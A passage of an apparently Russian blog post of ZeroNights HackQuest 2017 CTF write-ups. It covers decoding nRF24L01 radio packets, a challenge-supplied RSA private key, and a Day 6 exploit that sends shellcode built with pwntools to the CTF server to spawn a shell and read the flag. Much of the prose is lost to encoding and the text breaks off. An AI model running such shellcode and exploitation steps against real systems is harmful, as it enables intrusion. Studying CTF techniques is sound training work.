class="hljs-number">3</span></span>c0aaccaaccaaccce21b432b1b59030b737ba3432b91031b430b73732b6399080000000000000002924caa [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1585</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>c35566556655666790d85b881dd9481d185b1ac818589bdd5d081cd958dd5c9a5d1e4fc000000010fa411 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1166</span></span> samples] <span class="hljs-number"><span class="hljs-number">3</span></span>e0aaccaaccaacccf21b0b7103bb2903a30b6359030b137baba1039b2b1bab934ba3c9f8000000021f4822 [<span class="hljs-built_in"><span class="hljs-built_in">Pause</span></span>: <span class="hljs-number"><span class="hljs-number">1183</span></span> samples]</code> </pre> <br><p>        ,   ,        . </p><br><p>  ,      ,    .      : </p><br><pre> <code class="html hljs xml">these devices are used iN wiReless keyboards and sometimes in Flying drones</code> </pre> <br><p>      <code>NRF</code> .  ,            ,     ‚Äî <code>nrf24l01</code> . ,     ,   . </p><br><p>        ,     <code>ShockBurst</code> .      : </p><br><p><img src="https://habrastorage.org/webt/l-/lb/ak/l-lbak9h6cq8kyebs3reedjkzrk.png"></p><br><p>       :      <code>aa</code> ( <code>10101010</code> )  <code>55</code> ( <code>01010101</code> ). ,        .   ,  ,       URH,   "". </p><br><p>     <code>Edit -&gt; Decoding</code> .    <code>Additional Functions</code>  <code>Cut before/after</code> ,    <code>Sequence</code>   <code>10101010</code> .    <code>cut_aa</code> . </p><br><p><img src="https://habrastorage.org/webt/bi/tb/kz/bitbkzqlzcqr06ozjbow-a2v00i.png"></p><br><p>   <code>01010101</code>    ,    <code>Sequence</code> . </p><br><p>    <code>Analysis</code> .   <code>cut_aa</code>  . </p><br><p><img src="https://habrastorage.org/webt/4v/h8/wn/4vh8wnxoahuvuqq8isxbaz-yfqs.png"></p><br><p> URH         .        (-)   <code>Add label</code> .   ,     (   ,       ). </p><br><p><img src="https://habrastorage.org/webt/3o/mz/74/3omz74byhh-2f7wgw8hwwzx4lo4.png"></p><br><p>     <code>Packet Control Field</code> .   <code>ShockBurst</code>   ,     9 .       9 . </p><br><p><img src="https://habrastorage.org/webt/zi/jd/yl/zijdyllmqin2hpmen_cvlz3bsqy.png"></p><br><p>   URH  ,       ,      .      <code>Packet Control Field</code>    10  11  (     58  59),    9  10! </p><br><p>   <code>payload</code>  <code>CRC</code> . </p><br><p><img src="https://habrastorage.org/webt/hb/mw/er/hbmwerb5-ybcvnblrxc-drc1ss8.png"></p><br><p>       ascii,   -    <code>payload</code> . </p><br><p><img src="https://habrastorage.org/webt/hp/5m/oo/hp5mootnjvqw94sy60j2kns9pvg.png"></p><br><p>       <code>This is test message</code> .    ,       (URH +  +  ),        ,       . </p><br><p>   10 ,        . ,       ,     ,   ,   2401,    ,    . </p><br><h3 id="2405">  2405 </h3><br><p>   <code>2405</code>       ,    <code>paylod</code>  <code>ShockBurst</code> .   <code>Transport for Moving Big Packet</code> ‚Äî <code>TMBP</code> . </p><br><div class="spoiler"> <b class="spoiler_title">TMBP structure</b> <div class="spoiler_text"><pre> <code class="html hljs xml">Welcome to NSA - Not Safe Agency! Our transport protocol - TMBP (Transport for Moving Big Packets) is very simple, and it allows you to send big packets via ShockBurst protocol by using NRF24l01 module. Big packet - it is a packet that is larger than 22 bytes (max size of DATA in one packet), such packet must be fragmented into multiple pieces. TMBP structure: | Dest Addr | Src Addr | Stream ID | All len | Cur Offset | DATA | 2 2 2 2 2 22 Dest Addr - 2 bytes of address of a destination host Src Addr - 2 bytes of address of your host Stream ID - 2 bytes identification number of a stream which is used to transmit one Big packet All len - 2 bytes total length of Big packet Cur Offset - 2 bytes of an offset (how much Big packet's bytes were transmitted including bytes in a current packet) Destination addresses you can find on the Broadcast channel. All other parameters will be generated automatically. Also, you don't need to set up connection between you and a destination host, it will be created automatically. The only thing you need is a destination address! TMBP packet is incapsulated into ShockBurst protocol packet in NRF24l01. NRF24l01 address length is 5 bytes, during connection NRF24l01 address consists of 2 bytes of destination address + 2 bytes of source address + 0x00 byte. Addresses of Broadcast channels are hardcoded in an intial configuartion and are constant. Some channels don't use TMBP. Our channels configuration 2401 - Hint channel 2402 - Open broadcast channel 2403 - Open channel 2404 - Test channel 2405 - Link to transport protocol channel 2406 - Encrypted channel 1 2407 - Encrypted channel 2 2408 - Reserved channel 2409 - Broadcast channel 2410 - History channel</code> </pre> </div></div><br><p>    <code>TMBP</code> ,     <code>payload</code>   .      ,      ,      ( <code>payload</code> ),     ( <code>Stream ID</code>   <code>TMBP</code> ). </p><br><h3 id="2406">  2406 </h3><br><p>  2406    .       : </p><br><ol><li> Dave to Steve <br> <code>Steve, I'm confused with all these keys for RSA. Is this is the one that I should use? https://pastebin.com/Di7LyG7Q?</code> </li> <li> Steve to Dave <br> <code>Dave, you are doing it wrong! This channel is only for encrypted messages! Please generate new RSA key pair. To understand how this thing works send me an encrypted message using my public key: https://pastebin.com/eRFbC3BE</code> </li> <li> Dave to Steve <br> <code>Ok Steve, catch encrypted data in next message.</code> </li> <li> Dave to Steve <br> <code>4acea423fbbc878fea55a2c41a9646d5712c670cd910a525ef061cc26f02f10ff9bba6ccf9baad0e99e3064b4512413c0b34e5933d6186f65d4fcda19a7e7a54</code> </li> </ol><br><p>           </p><br><pre> <code class="html hljs xml">-----BEGIN RSA PRIVATE KEY----- MIIBcwIBAAJAcCumoSCT6M/MPP7KwjzMT+9IEKWDhb/g+dg0mOFwnZfuvpr2bLC4 d2o1Ej2iG4/L0aJTrN2+kQMWOkRqB3uMZwJANjiCXRz9EWpXSHK+I2u7MQ3ay5D2 Iv5QSXchZ18zeY2j3prNYrUel43XHPbJzYXzYF5zrRHnH59UkY8iXYbQPwJAI/v6 Kwi8101wt0sSWdiUifsABiBtTBoMV/8skRi0EYmICXwvcEPwmFN2JucjNJBYoO2P HH3sQ65E53g+CPSA/wIg0OcbbzuSkFiPG1kviH74XFOmMNiqQHOQWuw1eoOxuxcC IIl1nAeixKVa296X84/0kiCXIF/eUsucSPidRVhg8UsxAiA3jAN3PhECl32UMDK6 907+ku8WFDXBuuXucsRplYQGQwIgk6eShjY5YR8uf+Tn6PpTQJYd1ndHjVlnYRTJ mjLjZvMCIIk7ZVY75SN3/xkoIGWM28aesFucWtKInmp0EoblvTOH -----END RSA PRIVATE KEY-----</code> </pre> <br><p>     </p><br><pre> <code class="html hljs xml">-----BEGIN PUBLIC KEY----- MIGaMA0GCSqGSIb3DQEBAQUAA4GIADCBhAJAcCumoSCT6M/MPP7KwjzMT+9IEKWD hb/g+dg0mOFwnZfuvpr2bLC4d2o1Ej2iG4/L0aJTrN2+kQMWOkRqB3uMZwJAQui2 EbKYnqOAk6/dWzJPBUFeAX7Jl5rMj0QLCjAf51JdiX1A9DtKN27fH0MQ1X7zMvHm 4RojILm9moV9ut+S1w== -----END PUBLIC KEY-----</code> </pre> <br><p>     ,     <code>PKCS#1</code> .  <code>openssl</code>    ,  ,   RSA,      , ,      <a href="https://ru.wikipedia.org/wiki/%25D0%259A%25D1%2580%25D0%25B8%25D0%25BF%25D1%2582%25D0%25BE%25D0%25B0%25D0%25BD%25D0%25B0%25D0%25BB%25D0%25B8%25D0%25B7_RSA">   RSA</a> . </p><br><p>  ,         : </p><br><pre> <code class="html hljs xml">flag{stup1d_ns4_h4ck1ng_dev1ce_zn2017}</code> </pre> <br><h3 id="alternativnoe-reshenie">  Alternative solution </h3><br><p>      ,    ,    <code>SDR</code>    <code>NRF24l01</code> . </p><br><p> ,   ,       ,  <code>SDR</code> ,  <code>hackRF</code>  <code>bladeRF</code> .    <code>NRF</code> ,        . </p><br><p>    ,    <code>NRF</code>      ,       <code>ShockBurst</code> .     : </p><br><ul><li>  ‚Äî      ,          . </li><li>  ‚Äî   ,    <code>NRF24l01</code>  <code>promiscuous</code> .           .    : <br><ul><li> -,    ,   <code>ShockBurst</code>        <code>0xAA</code>  <code>0x55</code> (    ). ,         . </li><li> -,      2 ,   . </li><li> -,          <code>0x00</code> .  ,    <code>0x00AA</code>  <code>0x0055</code>           <code>promiscuous</code> ,     . </li></ul></li></ul><br><p>  ,    ,    ,    <code>NRF</code>       .       ,      . </p></div></div><br><hr><br><h1> Day 6. Strange command server </h1><br><p>   pwn  RuCTFe,      -,    ,    . ,        . </p><br><table><tbody><tr><td colspan="3" align="center">  Winners </td></tr><tr><td align="center"> <b>1 </b> </td><td align="center"> <b>2 </b> </td><td align="center"> <b>3 </b> </td></tr><tr><td align="center"><pre> <code class="html hljs xml">Aleksey Cherepanov</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">smalukav</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">paulch</code> </pre> </td></tr></tbody></table><br><p>  : <code>okob2008</code> , <code>Kurlikasd</code> , <code>mcstarpro</code> </p><br><div class="spoiler"> <b class="spoiler_title">6th day writeup. (by Aleksey Cherepanov)</b> <div class="spoiler_text"><br><p> TL;DR: 7       <code>read(0, stack, big_N)</code> ,        .       ... </p><br><h3 id="zadacha">  Task </h3><br><blockquote> Day 6 / Strange command server <br><br> Some server receives commands in a very strange format. We have some <a href="http://hackquest.zeronights.org/downloads/task6/hq2017_task6_test.txt">command</a> for it and its <a href="http://hackquest.zeronights.org/downloads/task6/hq2017_task6_m116">sources</a> . <br> It is located on  nc spbctf.ppctf.net 5353 <br> Get the flag! </blockquote><p>  <strong>Structure</strong> </p><br><ul><li> <a href="https://habr.com/ru/company/dsec/blog/342224/">  </a> </li><li> <a href="https://habr.com/ru/company/dsec/blog/342224/"> </a> </li><li> <a href="https://habr.com/ru/company/dsec/blog/342224/"> </a> </li><li> <a href="https://habr.com/ru/company/dsec/blog/342224/">    </a> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    </li></ul><br><p>  <code>hq2017_task6_test.txt</code> : </p><br><pre> <code class="html hljs xml">5 13644205794.0 385557128.099 -566484950.0 -385556280.099 -12510807118.0</code> </pre> <br><p> <code>hq2017_task6_m116</code> ‚Äî   ,   : </p><br><pre> <code class="html hljs xml">$ file hq2017_task6_m116 hq2017_task6_m116: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped $ sha256sum hq2017_task6_m116 65d94868039be955bbb7774b4dea01d7404ce3bda6250343a109900b5dd68007 hq2017_task6_m116</code> </pre> <br><h3 id="anchorday6_briefanchor-kratkoe-opisanie-resheniya"><a name="day6_brief"></a>    </h3><br><p>    :      ELF  Linux x86-64 (  file).    .  ,    ‚Äî   . ELF ,  .       snowman ‚Äî  .     objdump ‚Äî  :    . </p><br><p>       ,   ,  ,   :    ,            .    ,   :  backdoor  ?  ? </p><br><p>              ‚Äî ,  "cafebabe".     "cafebabe".      ,    jmp  call .      : <code>callq *-0x20(%rbp)</code> ,     . </p><br><p>   .  1      ‚Äî   .      ‚Äî   <code>SIGILL</code> .  It is interesting!   gdb   :  ,     <code>SIGILL</code> ,   .  <code>checksec</code> : <code>NX</code> .  breakpoint    ,  1            ,   .  :        .   ,    ,      :  rip ($pc)     . </p><br><p>      ,    gdb       16    .    : -,               breakpoint', -,       4    .    4     :     ,  ,        6   ;    ,    . </p><br><p>        : 8    , ,  8    ,   ;  ‚Äî - 16  . 16  ‚Äî      (  ),   ,     read,    ,     . </p><br><p>       ‚Äî  SIGSEGV,    .     read. , shellcode  8 : </p><br><ul><li> <code>push rdx ; pop rax</code> ‚Äî    rdx  rax  , </li><li> <code>pop rdx</code> ‚Äî  rdx     , </li><li> <code>pop rsi</code> ‚Äî  rsi   ,     , </li><li> <code>push rbx ; pop rdi</code> ‚Äî    rbx  rdi  , </li><li> <code>syscall</code> ‚Äî   . <br>      ,  ,     8    .       7    . </li></ul><br><p>         ,    .      .    2 .   3   ( <code>pop rdi ; syscall</code> ).     ,     ‚Äî 331615.          .    ‚Äî 331615 * 2:     ,  ,   ‚Äî .      . </p><br><p>   ,    .  shellcode   pwntools.           ,      ,         .   shellcode  nop:     ,      . </p><br><p>    : </p><br><pre> <code class="html hljs xml">user@ctf:~$ printf '331615\n1105016229177322000000.0\n' &gt; input user@ctf:~$ python -c 'from pwn import *; context.arch = "x86_64"; print asm("nop") * 200 + asm(shellcraft.amd64.linux.sh())' &gt; payload user@ctf:~$ (cat input; sleep 1; cat payload; sleep 1; echo ls) | nc spbctf.ppctf.net 5353 flag.txt m116 run.sh run_image.sh runserver.sh ^C user@ctf:~$ (cat input; sleep 1; cat payload; sleep 1; echo cat flag.txt) | nc spbctf.ppctf.net 5353 H0P3_U_3Nj0Y3D_OU12_OBFUSKATOR</code> </pre> <br><p>           3  51    . </p><br><p>     :  'xchg eax, edx'  rax                 .  : 2 2848553957111076.0.           . </p><br><h3 id="anchorday6_toolsanchorispolzovannye-instrumenty"><a name="day6_tools"></a>   </h3><br><p>       . ,  snowman, pwntools  ROPgadget,   Debian      "  ". </p><br><ul><li>    Debian ‚Äî      , </li><li> <code>file</code> ‚Äî    , </li><li> <code>strings</code> ‚Äî       ( ), </li><li> <code>snowman</code> ‚Äî    ( ), </li><li> <code>objdump</code> ‚Äî   , </li><li> <code>readelf</code> ‚Äî     , </li><li> <code>strace</code>  <code>ltrace</code> ‚Äî      ( ), </li><li> <code>gdb</code> ‚Äî     ,     , </li><li> <code>python</code> ‚Äî   ,   pwntools, </li><li> <code>pwntools</code> : <br><ul><li> <code>asm()</code> ‚Äî   shellcode', </li><li> <code>disasm()</code> ‚Äî    shellcode', </li><li> <code>shellcraft.amd64.linux.sh()</code> ‚Äî    shellcode'    , </li></ul></li><li> <code>Perl</code> , <code>cat</code> , <code>sed</code> , <code>grep</code>    ,       bash ‚Äî      , </li><li> <code>ROPgadget</code> ‚Äî        ( ), </li><li> <code>man 2 read</code> ‚Äî       read, </li><li> <code>emacs</code> ‚Äî        shell-mode. </li></ul><br><h3 id="anchorday6_ideasanchor-poleznye-idei"><a name="day6_ideas"></a>  Useful ideas </h3><br><ul><li> CTF' ‚Äî         .      .   CTF'    <a href="https://ctftime.org/event/list/upcoming"></a> . </li><li> ZeroNights HackQuest ‚Äî    :  1           .      .   HackQuest'      .   ! </li><li>  NX ‚Äî    . </li><li>             ,   .         ,   .    ,   (   ,  ). </li><li>  shellcode  ,      .        ,    . </li><li>    6-8     -    ( / ),        read.    ,    . </li><li>   read    ,   shellcode    . </li><li>  shellcode             -  . </li><li>   read       ,    ROP-chain   (,   tiny backdoor v2  HackOver CTF 2016). </li><li>   gdb: <code>printf '...' &gt; input &amp;&amp; printf 'run &lt; input \n ...' | gdb ...</code> </li><li>    gdb (  ,      ): <code>printf '... \n while 1 \nx/1i $pc \n si \n end \n' | gdb ...</code> </li><li> shellcode    ,  .    (  127 )  2 .      pwntools,    nop'   "",  .   1 : <code>asm('jmp L ; nop ; L: nop')</code> , nop'   . </li><li>         pwntools: <code>for i in range(256): print disasm(chr(i))</code> </li><li> <code>xchg eax, edx</code>  x86-64  1 .         rax ( rdx).    rdx  0   rax. </li></ul><br><h3 id="anchorday6_fullanchor-podrobnoe-reshenie-s-polnymi-komandami"><a name="day6_full"></a>      </h3><br><p>       .       .       . <code>hq2017_task6_m116</code>   <code>m1</code> .     ,   ,    ,    .  ,  one-liner'       (      ). </p><br><p>   : </p><br><pre> <code class="bash hljs">user@ctf:~$ readelf -a m1 ... Entry point address: 0x400710 ...</code> </pre> <br><p>  : </p><br><pre> <code class="diff hljs">user@ctf:~$ printf 'break *0x400710 \n set pagination off \n run &lt; hq2017_task6_test.txt \n while 1 \nx/1i $pc \n si \n end' | gdb ./m1 | grep -e call -e jmp ... =&gt; 0x4009ae: callq *-0x20(%rbp) ... =&gt; 0x400ac8: callq 0x4006a0 &lt;printf@plt&gt; ...</code> </pre> <br><p>   printf': </p><br><pre> <code class="diff hljs">user@ctf:~$ gdb ./m1 ... (gdb) break printf Breakpoint 1 at 0x4006a0 (gdb) run &lt; hq2017_task6_test.txt ... Breakpoint 1, __printf (format=0x6021b7 "%x\n") at printf.c:28 (gdb) info regi ... rsi 0xcafebabe 3405691582 rdi 0x6021b7 6300087 ... (gdb) finish Run till exit from #0 __printf (format=0x6021b7 "%x\n") at printf.c:28 cafebabe 0x0000000000400acd in ?? () ...</code> </pre> <br><p>  SIGILL,     : </p><br><pre> <code class="bash hljs">user@ctf:~$ <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'5\n13644205794.0 385557128.099 -566484950.0 -385556280.099 -2510807118.0\n'</span></span> &gt; input &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'set pagination off \n run &lt; input \n info regis \nx/10i $pc \n'</span></span> | gdb ./m1</code> </pre> <br><pre> <code class="markdown hljs">... Program received signal SIGILL, Illegal instruction. ... rip 0x7fffffffe58a 0x7fffffffe58a ... (gdb) =&gt; 0x7fffffffe58a: (bad) 0x7fffffffe58b: rex.WX retq 0x7fffffffe58d: retq</code> </pre> <br><p>         </p><br><pre> <code class="hljs matlab"><span class="hljs-number"><span class="hljs-number">0x4009ae</span></span>: callq *<span class="hljs-number"><span class="hljs-number">-0x20</span></span>(<span class="hljs-comment"><span class="hljs-comment">%rbp)</span></span></code> </pre> <br><pre> <code class="bash hljs">user@ctf:~$ <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'5\n13644205794.0 385557128.099 -566484950.0 -385556280.099 -2510807118.0\n'</span></span> &gt; input &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'set pagination off \n break *0x4009ae \n run &lt; input \n si \n info regis \nx/10i $pc \n'</span></span> | gdb ./m1</code> </pre> <br><pre> <code class="markdown hljs">... Breakpoint 1, 0x00000000004009ae in ?? () ... rip 0x7fffffffe588 0x7fffffffe588 ... (gdb) =&gt; 0x7fffffffe588: mov $0x4e,%cl 0x7fffffffe58a: (bad) 0x7fffffffe58b: rex.WX retq 0x7fffffffe58d: retq</code> </pre> <br><p>   <code>0x7fffffffe588</code>  ‚Äî      (    ). ,   ,   ,  gdb   .    ,     . </p><br><pre> <code class="markdown hljs">user@ctf:~$ gdb ./m1 ... (gdb) run Starting program: /home/user/m1 ^C ... (gdb) info proc process 26241 ... (gdb) ! cat /proc/26241/maps ... 7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0 [stack] ... (gdb) p 0x7fffffffe588 &gt; 0x7ffffffde000 &amp;&amp; 0x7fffffffe588 <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt; </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">0x7ffffffff000</span></span></span></span><span class="xml"><span class="hljs-tag"> $</span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">1</span></span></span></span><span class="xml"><span class="hljs-tag"> = </span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">1</span></span></span></span><span class="xml"><span class="hljs-tag"> (</span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">gdb</span></span></span></span><span class="xml"><span class="hljs-tag">) </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">dump</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">binary</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">memory</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">bin01</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">0x7ffffffde000</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">0x7fffffffefff</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">...</span></span></span></span></span></span></code> </pre> <br><p>  ROPgadget   (     ): </p><br><pre> <code class="bash hljs">user@ctf:~$ ~/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/bin/ROPgadget --binary bin01 --rawMode=64 --rawArch=x86 ...</code> </pre> <br><p>  checksec: NX . </p><br><pre> <code class="bash hljs">user@ctf:~$ ./checksec.sh/checksec --format json --file m1 ...,<span class="hljs-string"><span class="hljs-string">"nx"</span></span>:<span class="hljs-string"><span class="hljs-string">"no"</span></span>,...</code> </pre> <br><p>             (0x4142 == 16706): </p><br><pre> <code class="bash hljs">user@ctf:~$ <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'5\n0.0\n'</span></span> &gt; input &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'set pagination off \n break *0x4009ae \n run &lt; input \n si \nx/16xb $pc \n'</span></span> | gdb ./m1 | sed -e <span class="hljs-string"><span class="hljs-string">'s/(gdb) //; s/\t/ /g'</span></span> | grep <span class="hljs-string"><span class="hljs-string">'^0x[a-f0-9]\+:'</span></span> 0x7fffffffe588: 0x00 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe590: 0xd1 0xe0 0xff 0xff 0x05 0x00 0x00 0x00 user@ctf:~$ <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'4\n0.0\n'</span></span> ... 0x7fffffffe588: 0x00 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe590: 0xd1 0xe0 0xff 0xff 0x04 0x00 0x00 0x00 user@ctf:~$ <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'16706\n0.0\n'</span></span> ... 0x7fffffffe588: 0x00 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe590: 0xd5 0xe0 0xff 0xff 0x42 0x41 0x00 0x00</code> </pre> <br><p>       4.  ,       1     6. </p><br><pre> <code class="bash hljs">user@ctf:~$ seq 1000 | <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-built_in"><span class="hljs-built_in">read</span></span> -ra; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'4\n%s.0\n'</span></span> <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$a</span></span></span><span class="hljs-string">"</span></span> &gt; input &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'set pagination off \n break *0x4009ae \n run &lt; input \n si \nx/8xb $pc \n'</span></span> | gdb ./m1 | sed -e <span class="hljs-string"><span class="hljs-string">'s/(gdb) //; s/\t/ /g'</span></span> | grep <span class="hljs-string"><span class="hljs-string">'^0x[a-f0-9]\+:'</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> 0x7fffffffe588: 0x00 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe588: 0x00 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe588: 0x01 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe588: 0x01 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe588: 0x01 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe588: 0x01 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe588: 0x01 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe588: 0x01 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 0x7fffffffe588: 0x02 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 ...</code> </pre> <br><p>    .   7         . (      Python) </p><br><pre> <code class="bash hljs">user@ctf:~$ <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-built_in"><span class="hljs-built_in">read</span></span> -ra; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'4\n%s.0\n'</span></span> <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$a</span></span></span><span class="hljs-string">"</span></span> &gt; input &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'set pagination off \n break *0x4009ae \n run &lt; input \n si \nx/8xb $pc \n'</span></span> | gdb ./m1 | sed -e <span class="hljs-string"><span class="hljs-string">'s/(gdb) //; s/\t/ /g'</span></span> | grep <span class="hljs-string"><span class="hljs-string">'^0x[a-f0-9]\+:'</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> &gt;&gt;&gt; 0x41 * 6 390 0x7fffffffe588: 0x41 0xc3 0xc3 0xc3 0x00 0x00 0x00 0x00 &gt;&gt;&gt; 0x4142 * 6 100236 0x7fffffffe588: 0x42 0x41 0xc3 0xc3 0xc3 0x00 0x00 0x00 &gt;&gt;&gt; 0x414243 * 6 25660818 0x7fffffffe588: 0x43 0x42 0x41 0xc3 0xc3 0xc3 0x00 0x00 &gt;&gt;&gt; 0x41424344 * 6 6569169816 0x7fffffffe588: 0x44 0x43 0x42 0x41 0xc3 0xc3 0xc3 0x00 &gt;&gt;&gt; 0x4142434445 * 6 1681707473310 0x7fffffffe588: 0x45 0x44 0x43 0x42 0x41 0xc3 0xc3 0xc3 &gt;&gt;&gt; 0x414243444546 * 6 430517113167780 0x7fffffffe588: 0x46 0x45 0x44 0x43 0x42 0x41 0xc3 0xc3 &gt;&gt;&gt; 0x41424344454647 * 6 110212380970952106 0x7fffffffe588: 0x48 0x46 0x45 0x44 0x43 0x42 0x41 0x00 &gt;&gt;&gt; 0x4142434445464748 * 6 28214369528563739568L 0x7fffffffe588: 0x00 0x48 0x46 0x45 0x44 0x43 0x42 0x41 &gt;&gt;&gt; 0x1234567890112233 * 6 7870610803708579122 0x7fffffffe588: 0x00 0x22 0x11 0x90 0x78 0x56 0x34 0x12</code> </pre> <br><p>   shellcode',  ,       . </p><br><pre> <code class="bash hljs">user@ctf:~$ <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'4\n1.0\n'</span></span> &gt; input &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'set pagination off \n break *0x4009ae \n run &lt; input \n si \nx/4xg $rsp \n info reg \n'</span></span> | gdb ./m1 | sed -e <span class="hljs-string"><span class="hljs-string">'s/(gdb) //'</span></span> ...</code> </pre> <br><pre> <code class="html hljs xml">0x00007fffffffe588 in ?? () 0x7fffffffe528: 0x00000000004009b1 0x00007fffffffe588 0x7fffffffe538: 0x3fc5555555555555 0x000000000000007c rax 0x7fffffffe500 140737488348416 rbx 0x0 0 rcx 0xc3c3c300 3284386560 rdx 0x0 0 rsi 0x7fffffffe6d0 140737488348880 rdi 0x400710 4196112 rbp 0x7fffffffe5a0 0x7fffffffe5a0 rsp 0x7fffffffe528 0x7fffffffe528 r8 0x0 0 r9 0x7ffff787ec60 140737346268256 r10 0x7fffffffe2f0 140737488347888 r11 0x7ffff7b01530 140737348900144 r12 0x400710 4196112 r13 0x7fffffffe6d0 140737488348880 r14 0x0 0 r15 0x0 0 rip 0x7fffffffe588 0x7fffffffe588 ...</code> </pre> <br><p>     : <code>0x00000000004009b1</code> ‚Äî    shellcode', <code>0x00007fffffffe588</code> ‚Äî     . </p><br><p>  pwntools     shellcode': </p><br><pre> <code class="html hljs xml">&gt;&gt;&gt; from pwn import * &gt;&gt;&gt; context.arch = "x86_64" &gt;&gt;&gt; print asm('pop rdi; syscall')[::-1].encode('hex') 050f5f &gt;&gt;&gt; 0x050f5f 331615</code> </pre> <br><p>  pwntools     shellcode'  : 5  , 2  ‚Äî   5 , nop' ("90"  hex). nop'  . </p><br><pre> <code class="html hljs xml">&gt;&gt;&gt; print asm('push rdx ; pop rax ; pop rdx ; pop rsi ; push rbx ; jmp L ; nop ; nop ; nop ; nop ; nop ; L: nop')[::-1].encode('hex') 90909090909005eb535e5a5852 &gt;&gt;&gt; 0x05eb535e5a5852 * 331615 * 2 1105019561413684439260L</code> </pre> <br><p>     ,    : </p><br><pre> <code class="bash hljs">user@ctf:~$ <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-built_in"><span class="hljs-built_in">read</span></span> -ra; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'331615\n%s.0\n'</span></span> <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$a</span></span></span><span class="hljs-string">"</span></span> &gt; input &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span 